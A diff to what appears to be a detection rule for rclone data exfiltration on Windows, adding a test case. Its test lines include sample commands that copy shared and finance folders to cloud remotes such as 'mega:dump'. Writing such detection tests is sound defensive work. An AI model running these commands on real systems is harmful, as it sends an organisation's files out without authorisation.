@@ -31,4 +31,5 @@ level: high
 # OriginalFileName exists only in Sysmon events; on Security 4688 and in memory
 # the rule relies on the image name.
 # test-match: Image="C:\Users\jdoe\Downloads\rclone.exe" CommandLine="rclone.exe copy C:\Shares remote:bucket --transfers 16"
+# test-match: Image="C:\ProgramData\rc\rclone.exe" CommandLine="rclone.exe sync D:\Finance mega:dump --ignore-existing"
 # test-nomatch: Image="C:\Users\jdoe\Downloads\rclone.exe" CommandLine="rclone.exe version"
